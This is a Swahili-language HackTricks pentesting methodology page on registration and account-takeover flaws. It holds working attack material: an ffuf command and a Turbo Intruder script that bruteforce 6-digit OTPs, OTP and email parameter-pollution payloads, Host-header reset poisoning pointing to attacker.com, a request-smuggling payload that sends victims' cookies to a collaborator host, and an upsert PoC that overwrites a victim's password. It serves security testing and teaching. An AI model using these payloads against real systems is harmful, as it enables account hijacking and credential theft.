# Udhaifu za Usajili na Kuchukua Akaunti

{{#include ../banners/hacktricks-training.md}}

## Kuchukua Akaunti kwa Usajili

### Usajili Rudufu

- Jaribu kuunda ukitumia jina la mtumiaji lililopo
- Angalia kutumia tofauti za barua pepe:
- Herufi kubwa (uppercase)
- +1@
-ongeza nukta kwenye barua pepe
- tabia maalum katika sehemu ya jina la barua pepe (%00, %09, %20)
- Weka blank characters baada ya barua pepe: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Jaribu mbinu za canonicalization za mtoa huduma wa barua pepe (inategemea huduma):
- Gmail haisahau nukta na subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` zinafikisha kwa `victim@gmail.com`
- Watoa huduma wengine hawazingatii utofauti wa herufi (case-insensitive) katika local-part
- Watoa huduma wengine wanakubali unicode confusables. Jaribu homoglyphs na soft hyphen `\u00AD` ndani ya local-part
- Tumia haya ku: bypass uniqueness checks, kupata duplicate accounts/workspace invites, au block sign‑ups za mshambuliwa (temporary DoS) wakati unajiandaa takeover

### Ugunduzi wa Jina la Mtumiaji

Angalia kama unaweza kubaini lini jina la mtumiaji limeshawasajiliwa ndani ya application.

- Ujumbe tofauti wa makosa au misimbo ya HTTP status
- Tofauti za muda (mtumiaji aliyepo anaweza kusababisha lookup kwa IdP/DB)
- Fomu ya usajili kujazwa moja kwa moja data za profile kwa barua pepe zinazojulikana
- Angalia team/invite flows: kuingiza barua pepe kunaweza kufichua kama akaunti ipo

### Sera ya Nywila

Unapotengeneza mtumiaji angalia sera ya nywila (angalia kama unaweza kutumia nywila dhaifu).\
Katika hali hiyo unaweza kujaribu bruteforce credentials.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement) ili ujifunze jinsi ya kujaribu account takeovers au kutoa taarifa kupitia **SQL Injections** kwenye fomu za usajili.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### Udhaifu za SAML


{{#ref}}
saml-attacks/
{{#endref}}

### Badilisha Barua Pepe

Ukiwa umejisajili jaribu kubadilisha barua pepe na angalia kama mabadiliko haya yanathibitishwa ipasavyo au kama unaweza kuibadilisha kuwa barua pepe yoyote ile.

### Vidokezo Zaidi

- Angalia kama unaweza kutumia **disposable emails** (mailinator, yopmail, 1secmail, etc.) au bypass the blocklist kwa subaddressing kama `victim+mailinator@gmail.com`
- **Long** **password** (>200) inasababisha **DoS**
- **Check rate limits on account creation**
- Tumia username@**burp_collab**.net na chunguza **callback**
- Ikiwa uthibitisho wa nambari ya simu unatumika, angalia phone parsing/injection edge cases

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

## Uthibitisho Dhaifu wa Barua Pepe/Simu (OTP/Magic Link)

Mtiririko wa usajili mara nyingi huthibitisha umiliki kupitia OTP ya nambari au token ya magic-link. Dosari za kawaida:

- OTP inayoweza kukisia au fupi (4–6 digits) bila rate limiting madhubuti au ufuatiliaji wa IP/kifaa. Jaribu parallel guesses na header/IP rotation.
- Reuse ya OTP kwenye vitendo au akaunti tofauti, au isiyofungwa kwa mtumiaji/tendo maalum (mfano: code ile ile inafanya kazi kwa login na signup, au inafanya kazi baada ya barua pepe kubadilishwa).
- Multi-value smuggling: baadhi ya backends zinakubali multiple codes na kuthibitisha kama yoyote inafanana. Jaribu:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` au `code=000000|123456`
- Response oracle: tambua tofauti kati ya wrong vs expired vs wrong-user codes kwa status/message/body length.
- Tokens zisizobatilishwa baada ya mafanikio au baada ya kubadilisha password/email.
- Verification token isiyofungwa kwenye user agent/IP inaruhusu cross-origin completion kutoka kurasa zinazodhibitiwa na mshambuliaji.

Mfano wa bruteforcing kwa kutumia ffuf dhidi ya endpoint ya JSON OTP:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Kukisia kwa sambamba ili kupitisha kufungwa mfululizo (tumia Turbo Intruder katika Burp):

<details>
<summary>Kipande cha Turbo Intruder cha kumwagilia majaribio ya OTP za tarakimu 6</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)

def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Jaribu racing verification: submit OTP sawa halali (OTP) kwa wakati mmoja katika vikao viwili; wakati mwingine kikao kimoja kinageuka kuwa akaunti ya attacker iliyothibitishwa wakati mchakato wa victim pia unafanikiwa.
- Pia jaribu Host header poisoning kwenye verification links (sawa na reset poisoning chini) ili leak au kukamilisha verification kwenye host inayodhibitiwa na attacker.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (kabla victim asajili)

Kategoria yenye nguvu ya matatizo hutokea wakati attacker anafanya vitendo kwenye email ya victim kabla victim kuunda akaunti yao, kisha attacker anarudisha upatikanaji baadaye.

Key techniques to test (rekebisha kwa flows za target):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Practical tips

- Harvest flows and endpoints kutoka web/mobile bundles. Tafuta classic signup, SSO linking, email/phone change, na password reset endpoints.
- Unda automation halisi ili kuweka sessions zikiendelea wakati unajaribu flows nyingine.
- Kwa SSO tests, setup test OIDC provider na issue tokens zenye `email` claims kwa anwani ya victim na `email_verified=false` ili kuangalia kama RP inamtumaini IdP isiyothibitishwa.
- Baada ya password reset yoyote au email change, thibitisha kwamba:
- sessions na tokens zote nyingine zimetolewa bila nguvu,
- uwezo wa pending email/phone change umefutwa,
- IdPs/emails/phones zilizowekwa awali zimerifiwa tena.

Note: Methodology kubwa na case studies za mbinu hizi zimeandikwa katika utafiti wa pre‑hijacking wa Microsoft (angalia References mwishoni).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Omba password reset kwa anwani yako ya email
2. Bonyeza kwenye password reset link
3. Usibadilishe password
4. Bonyeza/tembelea tovuti yoyote ya 3rd party (mfano: Facebook, twitter)
5. Kata ombi kwenye proxy ya Burp Suite
6. Angalia kama referer header inaleak token ya password reset.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Kata/Intercept ombi la password reset katika Burp Suite
2. Ongeza au hariri headers zifuatazo katika Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward ombi lenye header iliyobadilishwa\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Tafuta URL ya password reset inayotegemea _host header_ kama : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Mshambuliaji lazima aingie kwa akaunti yake na aende kwenye kipengele cha **Change password**.
2. Anzisha Burp Suite na Intercept ombi
3. Tuma kwenye tab ya Repeater na hariri vigezo : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Token ya reset ya nenosiri inapaswa kutengenezwa kimsurprise na kuwa ya kipekee kila wakati.\
Jaribu kubaini ikiwa token inaisha au ikiwa mara zote ni ile ile; katika baadhi ya kesi algorithimu ya uzalishaji ni dhaifu na inaweza kukisia. Vigezo vifuatavyo vinaweza kutumika na algorithimu.

- Timestamp
- UserID
- Email ya User
- Firstname na Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Chochea ombi la password reset ukitumia API/UI kwa email maalum mfano: test@mail.com
2. Chunguza jibu la server na angalia kwa `resetToken`
3. Kisha tumia token kwenye URL kama `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Jisajili kwenye mfumo kwa username sawa na username ya mwathiriwa, lakini ukaweka nafasi tupu kabla na/au baada ya username. mfano: `"admin "`
2. Omba password reset kwa kutumia username yako ya kibaya.
3. Tumia token iliyotumwa kwenye email yako na badilisha nenosiri la mwathiriwa.
4. Ingia kwenye akaunti ya mwathiriwa kwa nenosiri jipya.

Jukwaa CTFd lilikuwa dhaifu kwa shambulio hili.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Pata XSS ndani ya application au subdomain ikiwa cookie zimetengwa kwa domain kuu : `*.domain.com`
2. Leak **sessions cookie** ya sasa
3. Thibitisha kama mtumiaji ukitumia cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Tumia **smuggler** kugundua aina ya HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Tengeneza ombi litakalobadilisha `POST / HTTP/1.1` na data ifuatayo:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` lengo likiwa kufanya open redirect wa wahasiriwa kwenda burpcollab na kuiba cookie zao\
3. Ombi la mwisho linaweza kuonekana kama ifuatavyo
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Ripoti za Hackerone zimeripoti matumizi ya kasoro hii\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Kuchukua Akaunti kupitia CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Tengeneza payload kwa ajili ya CSRF, kwa mfano: “HTML form with auto submit for a password change”
2. Tuma payload

### Kuchukua Akaunti kupitia JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token inaweza kutumika kuthibitisha mtumiaji.

- Hariri JWT na User ID / Email tofauti
- Angalia saini dhaifu ya JWT

{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Baadhi ya signup handlers hufanya upsert wakati email iliyotolewa tayari inapatikana. Ikiwa endpoint inakubali body ndogo yenye email na password na haitekelezi uthibitisho wa umiliki, kutuma email ya mwathirika kutaandika tena password yao kabla ya uthibitisho.

- Discovery: kusanya majina ya endpoint kutoka bundled JS (au trafiki ya mobile app), kisha fuzz base paths kama /parents/application/v4/admin/FUZZ ukitumia ffuf/dirsearch.
- Method hints: GET inayorudisha ujumbe kama "Only POST request is allowed." mara nyingi inaonyesha kitenzi sahihi na kwamba JSON body inatarajiwa.
- Minimal body observed in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Mfano wa PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Athari: Full Account Takeover (ATO) bila reset token yoyote, OTP, au email verification.

## Marejeleo

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

{{#include ../banners/hacktricks-training.md}}
